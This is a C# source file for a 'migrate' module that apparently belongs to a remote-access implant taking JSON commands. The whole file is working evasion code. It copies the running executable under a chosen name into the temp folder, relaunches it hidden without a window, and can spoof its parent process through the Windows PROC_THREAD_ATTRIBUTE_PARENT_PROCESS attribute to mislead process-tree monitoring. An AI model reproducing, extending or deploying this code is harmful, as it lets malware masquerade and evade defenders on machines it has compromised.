using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace mullvad.Module.MigrateProcess
{
    public class MigrateProcessModule
    {
        public static string ModuleId => "mullvad.migrate";

        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "migrate": return Migrate(payload);
                    default:        return Err("unknown action");
                }
            }
            catch (Exception ex)
            {
                return Err(ex.Message);
            }
        }

        private static string Migrate(string payload)
        {
            string name    = ExtractStr(payload, "name");
            string path    = ExtractStr(payload, "path");
            string destDir = ExtractStr(payload, "dest_dir");
            string args    = ExtractStr(payload, "args");
            string ppid    = ExtractStr(payload, "ppid");
            bool   hidden  = ExtractBool(payload, "hidden", true);

            if (string.IsNullOrWhiteSpace(name))
                return Err("name is required");

            string self = Process.GetCurrentProcess().MainModule?.FileName;
            if (string.IsNullOrEmpty(self))
                return Err("cannot resolve current executable path");

            // copy or use provided path
            string exePath;
            if (!string.IsNullOrWhiteSpace(path))
            {
                exePath = path;
            }
            else
            {
                exePath = CopyExe(self, name, destDir);
                if (exePath == null)
                    return Err("failed to copy executable to destination");
            }

            // launch new process
            int pid;
            if (!string.IsNullOrWhiteSpace(ppid))
                pid = StartWithSpoofedParent(exePath, args, hidden, ppid);
            else
                pid = StartNormal(exePath, args, hidden);

            if (pid <= 0)
                return Err("failed to start new process");

            // give it a moment then verify it's alive
            Thread.Sleep(500);
            try
            {
                var proc = Process.GetProcessById(pid);
                if (proc.HasExited)
                    return Err("new process exited immediately after launch");
            }
            catch
            {
                return Err("new process could not be verified");
            }

            return Ok(pid);
        }

        // ── File copy with retry ─────────────────────────────────────────────

        private static string CopyExe(string source, string name, string destDir)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(destDir))
                    destDir = Path.GetTempPath();

                if (!Directory.Exists(destDir))
                    Directory.CreateDirectory(destDir);

                string fileName = name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                    ? name
                    : name + ".exe";
                string dest = Path.Combine(destDir, fileName);

                for (int attempt = 0; attempt < 3; attempt++)
                {
                    string target = attempt == 0
                        ? dest
                        : Path.Combine(destDir, Path.GetFileNameWithoutExtension(fileName)
                            + "_" + attempt + ".exe");
                    try
                    {
                        File.Copy(source, target, overwrite: true);
                        return target;
                    }
                    catch (IOException) when (attempt < 2)
                    {
                        Thread.Sleep(300);
                    }
                }
                return null;
            }
            catch { return null; }
        }

        // ── Process launch ───────────────────────────────────────────────────

        private static int StartNormal(string exePath, string args, bool hidden)
        {
            try
            {
                var psi = new ProcessStartInfo(exePath, args ?? "")
                {
                    CreateNoWindow  = hidden,
                    WindowStyle     = hidden ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
                    UseShellExecute = false,
                };
                var p = Process.Start(psi);
                return p?.Id ?? -1;
            }
            catch { return -1; }
        }

        private static int StartWithSpoofedParent(string exePath, string args, bool hidden, string parentName)
        {
            string parentExe = Path.GetFileNameWithoutExtension(parentName);
            Process[] parents = Process.GetProcessesByName(parentExe);
            if (parents.Length == 0)
                return StartNormal(exePath, args, hidden);

            IntPtr parentHandle = OpenProcess(PROCESS_CREATE_PROCESS, false, parents[0].Id);
            if (parentHandle == IntPtr.Zero)
                return StartNormal(exePath, args, hidden);

            GCHandle gcParent = default;
            IntPtr   attrList = IntPtr.Zero;
            try
            {
                IntPtr listSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref listSize);
                attrList = Marshal.AllocHGlobal(listSize);
                if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref listSize))
                    return StartNormal(exePath, args, hidden);

                IntPtr[] handleHolder = new IntPtr[] { parentHandle };
                gcParent = GCHandle.Alloc(handleHolder, GCHandleType.Pinned);
                IntPtr pHandle = gcParent.AddrOfPinnedObject();

                if (!UpdateProcThreadAttribute(
                        attrList, 0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        pHandle,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero, IntPtr.Zero))
                    return StartNormal(exePath, args, hidden);

                var si = new STARTUPINFOEX();
                si.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
                si.lpAttributeList = attrList;
                if (hidden)
                {
                    si.StartupInfo.dwFlags   |= STARTF_USESHOWWINDOW;
                    si.StartupInfo.wShowWindow = SW_HIDE;
                }

                uint flags = EXTENDED_STARTUPINFO_PRESENT;
                if (hidden) flags |= CREATE_NO_WINDOW;

                string cmdLine = string.IsNullOrWhiteSpace(args)
                    ? "\"" + exePath + "\""
                    : "\"" + exePath + "\" " + args;

                var pi = new PROCESS_INFORMATION();
                bool ok = CreateProcess(
                    null, cmdLine,
                    IntPtr.Zero, IntPtr.Zero,
                    false, flags,
                    IntPtr.Zero, null,
                    ref si, out pi);

                if (!ok) return StartNormal(exePath, args, hidden);

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return pi.dwProcessId;
            }
            finally
            {
                if (gcParent.IsAllocated) gcParent.Free();
                if (attrList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(attrList);
                    Marshal.FreeHGlobal(attrList);
                }
                CloseHandle(parentHandle);
            }
        }

        // ── P/Invoke ─────────────────────────────────────────────────────────

        const uint PROCESS_CREATE_PROCESS       = 0x0080;
        const uint EXTENDED_STARTUPINFO_PRESENT  = 0x00080000;
        const uint CREATE_NO_WINDOW             = 0x08000000;
        const int  STARTF_USESHOWWINDOW         = 0x00000001;
        const short SW_HIDE                     = 0;
        const int  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public int    dwProcessId, dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int    cb;
            public string lpReserved, lpDesktop, lpTitle;
            public int    dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute;
            public int    dwFlags;
            public short  wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr      lpAttributeList;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute,
            IntPtr lpValue, IntPtr cbSize,
            IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        // ── Payload parsing ──────────────────────────────────────────────────

        private static string ExtractStr(string json, string key)
        {
            var m = Regex.Match(json, "\"" + key + "\"\\s*:\\s*\"([^\"]*)\"");
            return m.Success ? m.Groups[1].Value : "";
        }

        private static bool ExtractBool(string json, string key, bool def)
        {
            var m = Regex.Match(json, "\"" + key + "\"\\s*:\\s*(true|false)");
            return m.Success ? m.Groups[1].Value == "true" : def;
        }

        // ── Response ─────────────────────────────────────────────────────────

        private static string Ok(int pid)
            => "{\"status\":\"migrated\",\"pid\":" + pid + "}";

        private static string Err(string msg)
            => "{\"error\":\"" + msg.Replace("\"", "\\\"") + "\"}";
    }
}
